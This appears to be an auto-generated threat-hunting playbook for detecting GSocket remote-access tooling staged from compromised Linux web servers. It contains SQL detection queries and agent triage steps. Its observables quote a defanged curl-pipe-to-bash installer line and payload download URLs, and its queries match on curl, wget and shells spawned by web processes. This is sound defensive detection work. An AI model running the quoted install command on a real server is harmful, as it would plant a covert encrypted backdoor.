---
analysis: A simple alert on 'curl | bash' is too noisy for production; this hunt uses
  a behavioral process lead followed by cross-surface corroboration in volatile directories
  to confirm weaponization.
blind_spots:
- id: no-process-telemetry
  question: whether a web server process spawned a shell or downloader
  requires: hb_process_activity from Linux servers
  risk: Without process execution logs, the behavioral lead will fail to identify
    the compromise.
  stage: deployment-downloader
- id: no-file-telemetry
  question: whether files were created by web service accounts in volatile paths
  requires: hb_file_activity with /dev/shm and /tmp coverage
  risk: Many EDR configurations exclude volatile or memory-backed paths like /dev/shm,
    hiding the staging activity.
  stage: concealed-staging
coverage:
- stage: initial-web-exploitation
  status: covered
  steps:
  - scoping-web-servers
  - lead-web-spawning-downloader
- stage: deployment-downloader
  status: covered
  steps:
  - lead-web-spawning-downloader
  - execution-from-volatile-paths
  - dns-to-relay-domains
- stage: concealed-staging
  status: covered
  steps:
  - web-account-file-staging
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: privilege-escalation-exploit
  status: out_of_scope
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: masqueraded-persistence
  status: out_of_scope
- reason: 'Belongs to another part of the ''The global socket: how threat actors are
    weaponizing GSocket for stealthy C2'' series.'
  stage: encrypted-relay-c2
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The 356% increase in GSocket weaponization demonstrates a high risk
    of persistent, encrypted remote access that bypasses traditional patch-based remediation.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has exploited a web application and is using the web server's
  process context to download and stage a remote access tool like GSocket in memory-backed
  or hidden directories.
labels:
- hunt
- attack.t1190
- attack.t1105
- attack.t1059.004
- attack.t1564.001
- attack.t1070.004
- command and control
- defense evasion
- execution
- initial access
- persistence
- privilege escalation
name: Linux Web Server Tool Staging and Execution
parameters:
  gsocket_domains:
    default:
    - gsocket.io
    - gsgg.b-cdn.net
    - cdn.gsocket.io
    description: Known domains used for GSocket relay and distribution.
    from:
      kind: article
      observed: '2026-11-11'
      ref: msrc-blog-2026-11-11
    type: list[domain]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: Optional list of hostnames to focus the lead query; leave empty for
      estate-wide.
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus the hunt on Linux servers running internet-facing web software (Apache,
  Nginx, PHP). Use the scoping step to identify targets and paste them into the scope_hosts
  parameter if narrowing the lead is required.
references:
- name: "Microsoft Security Blog \u2014 The global socket: how threat actors are weaponizing\
    \ GSocket for stealthy C2"
  url: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
related:
- hunt: gsocket-persistence-and-relay-c2
  reason: This hunt focuses on initial staging; follow-on activity involves systemd/cron
    persistence and relay network traffic.
  relation: follows
scenario:
  stages:
  - name: Web Application Compromise
    observables:
    - PHP web applications
    - cPanel hosting
    - Apache web server context
    - Remote code execution
    slug: initial-web-exploitation
    tactic: initial-access
    techniques:
    - T1190
  - name: Scripted Tool Retrieval
    observables:
    - curl -sSL hxxps://gsocket[.]io/y | bash
    - hxxps://gsocket[.]io/install.sh
    - hxxps://gsgg[.]b-cdn[.]net/bin/gs-netcat_mini-linux-x86_64
    - hxxps://cdn[.]gsocket[.]io/bin/gs-netcat_mini-linux-aarch64
    slug: deployment-downloader
    tactic: execution
    techniques:
    - T1105
    - T1059.004
  - name: Hidden Payload Staging
    observables:
    - /dev/shm/.gs-0/
    - /tmp/.gsn_ora
    - /tmp/systemd-remount-d
    - Memory-backed directories
    slug: concealed-staging
    tactic: defense-evasion
    techniques:
    - T1564.001
    - T1070.004
  - name: Kernel Exploitation
    observables:
    - CVE-2026-43284
    - Dirty Frag vulnerability
    slug: privilege-escalation-exploit
    tactic: privilege-escalation
    techniques:
    - T1068
  - name: Systemd and Cron Persistence
    observables:
    - systemd-remount-d
    - /usr/bin/systemd-remount-d
    - cron jobs
    - systemd units
    - kernel-thread-like names
    slug: masqueraded-persistence
    tactic: persistence
    techniques:
    - T1036
    - T1053.003
    - T1543.002
  - name: Relay Network C2
    observables:
    - gsocket.io
    - cdn.gsocket.io
    - gsgg.b-cdn.net
    - Outbound encrypted relay traffic
    - GS_TG_TOKEN
    - Telegram notification delivery
    slug: encrypted-relay-c2
    tactic: command-and-control
    techniques:
    - T1071
    - T1090.002
  summary: Threat actors are weaponizing GSocket, a legitimate encrypted relay tool,
    to maintain persistent outbound-only C2 on compromised Linux servers. By tunneling
    traffic through the public Global Socket Relay Network, attackers evade inbound
    firewall restrictions and bypass traditional IP-based blocking even after the
    initial web application vulnerability is patched.
series:
  index: 1
  slug: the-global-socket-how-threat-actors-are-weaponizing-gsocket-for-stealthy-c2
  title: 'The global socket: how threat actors are weaponizing GSocket for stealthy
    C2'
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Linux Web Server Tool Staging and Execution

Threat actors are weaponizing GSocket (Global Socket) on Linux servers to maintain persistent, encrypted access that survives application patching. This hunt focuses on the initial deployment phase where a compromised web server process executes a scripted downloader and stages a binary in memory-backed directories like /dev/shm or hidden /tmp paths. The hunt uses a gated flow: a cheap lead query identifies web server processes spawning downloaders or shell interpreters regardless of the target domain. If confirmed, the hunt fans out to look for the specific execution patterns in volatile paths, file creation by web service accounts, and connections to known relay domains.

## scoping-web-servers
<!-- Identify web server inventory -->
Find Linux servers running Apache, Nginx, PHP, or cPanel that represent the primary attack surface.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hostnames running web hosting software. Silence means no such
  software is indexed.
reads:
- device_hostname
- package_name
- package_version
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT DISTINCT device_hostname, package_name, package_version FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%apache%' OR LOWER(package_name) LIKE '%nginx%' OR LOWER(package_name) LIKE '%php%' OR LOWER(package_name) LIKE '%cpanel%')
```

## lead-web-spawning-downloader
<!-- Lead: Web server spawning downloaders -->
Identify hosts where web server processes are spawning tools used for external retrieval or shell execution.

```sqlite target=endpoint role=baseline params=(scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Anomalous process spawning from a web server context. Silence suggests no
  such shell or downloader activity occurred.
prevalence:
  by: device_hostname
  key:
  - parent_process_name
  - process_name
  rare_below: 5
reads:
- device_hostname
- parent_process_name
- process_name
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_hostname, parent_process_name, process_name, process_cmd_line, user_name, COUNT(*) as occurrence_count FROM hb_process_activity WHERE (LOWER(parent_process_name) LIKE '%apache%' OR LOWER(parent_process_name) LIKE '%httpd%' OR LOWER(parent_process_name) LIKE '%nginx%' OR LOWER(parent_process_name) LIKE '%php-fpm%' OR LOWER(parent_process_name) LIKE '%cpanel%') AND (LOWER(process_name) LIKE '%curl%' OR LOWER(process_name) LIKE '%wget%' OR LOWER(process_name) LIKE '%bash%' OR LOWER(process_name) LIKE '%sh%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1, 2, 3, 4, 5
```

## gate-read
<!-- Evaluate lead activity -->
```agent target=hunter
cite: required
context:
- lead-web-spawning-downloader
max_iterations: 3
objective: Determine if the process activity in lead-web-spawning-downloader represents
  a suspicious download-and-execute pattern from a web context.
success_criteria: A verdict per host indicating if behavioral evidence warrants investigation.
tools:
- endpoint
```

## gate-decision
<!-- Gate Decision -->
if~: "The gate-read verdict is suspicious for at least one host." (confidence: high, judge=hunter)
then: → deep-analysis-fanout
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: no-process-telemetry)
else: → close-out

## deep-analysis-fanout
<!-- Deep Analysis Fan-out -->
parallel:
- → execution-from-volatile-paths
- → web-account-file-staging
- → dns-to-relay-domains
join: → agent-triage

## execution-from-volatile-paths
<!-- Execution from volatile paths -->
Identify the pattern of a fetcher tool (curl/wget/sh) initiating the execution of a binary from memory-backed or hidden directories.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: A process chain where a staged binary is executed by a shell or downloader
  context. Silence suggests no such tool execution occurred.
reads:
- device_hostname
- process_name
- process_cmd_line
- parent_process_name
- user_name
- time
- process_path
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_hostname, process_name, process_cmd_line, parent_process_name, user_name, time FROM hb_process_activity WHERE (process_path LIKE '/dev/shm/%' OR process_path LIKE '/tmp/%' OR process_path LIKE '/var/tmp/%') AND (LOWER(parent_process_name) LIKE '%bash%' OR LOWER(parent_process_name) LIKE '%sh%' OR LOWER(parent_process_name) LIKE '%curl%' OR LOWER(parent_process_name) LIKE '%wget%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## web-account-file-staging
<!-- File staging by web accounts -->
Corroborate by identifying file touches in volatile paths by accounts typically associated with web services.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days)
~~~yaml
expected: File creation in hidden or memory-backed paths by web service accounts.
  Silence means no such files were logged.
reads:
- device_hostname
- file_path
- process_name
- actor_user_name
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_hostname, file_path, process_name, actor_user_name, time FROM hb_file_activity WHERE (file_path LIKE '/dev/shm/%' OR file_path LIKE '/tmp/%' OR file_path LIKE '/var/tmp/%') AND (LOWER(actor_user_name) IN ('www-data', 'apache', 'nginx', 'cpanel', 'httpd', 'nobody')) AND time >= datetime('now', '-{{lookback_days}} days')
```

## dns-to-relay-domains
<!-- DNS resolutions for GSocket domains -->
Corroborate the behavioral evidence with lookups for known tool distribution and relay domains.

```sqlite target=endpoint role=enrichment params=(gsocket_domains=gsocket_domains, lookback_days=lookback_days)
~~~yaml
expected: DNS resolutions to gsocket.io or its CDNs. Silence suggests a custom or
  IP-based relay was used.
reads:
- device_hostname
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-11-12'
~~~
SELECT device_hostname, query_hostname, COUNT(*) as query_count, MIN(time) as first_seen FROM hb_dns_activity WHERE instr(',' || '{{gsocket_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY 1, 2
```

## agent-triage
<!-- Triage combined evidence -->
```agent target=hunter
cite: required
context:
- gate-read
- execution-from-volatile-paths
- web-account-file-staging
- dns-to-relay-domains
max_iterations: 6
objective: Determine if the correlated activity across process, file, and DNS telemetry
  indicates a GSocket deployment or unauthorized tool staging.
success_criteria: A malicious | suspicious | benign verdict per host, citing the command
  lines and volatile file paths.
tools:
- endpoint
```

## route-verdict
<!-- Route on verdict -->
if~: "the triage verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: no-file-telemetry)
else: → close-out

## isolate-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. Do not reboot, as contents in /dev/shm will be lost. Collect memory and volatile path contents first.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Review the triage agent's verdict and the cited process hierarchies. Check web server logs (Apache/Nginx) for RCE attempts or malicious file uploads matching the timing of the downloader activity.
```
→ end

## close-out
<!-- Close out -->
```manual target=analyst
Record the results of the hunt. If no activity was found, verify that the scoping query successfully identified web server assets.
```
→ end
